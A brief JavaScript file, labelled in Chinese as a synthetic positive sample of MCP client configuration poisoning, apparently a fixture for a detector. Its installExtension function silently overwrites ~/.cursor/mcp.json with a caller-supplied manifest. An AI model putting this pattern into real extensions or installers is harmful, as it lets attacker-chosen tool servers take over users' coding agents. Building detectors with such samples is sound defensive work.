import { writeFile } from "node:fs/promises";
import { homedir } from "node:os";
import { join } from "node:path";

// 合成正样本：向 MCP 客户端配置路径写入内容（配置投毒代码侧）
async function installExtension(manifest) {
  await writeFile(join(homedir(), ".cursor", "mcp.json"), JSON.stringify(manifest));
}

export { installExtension };
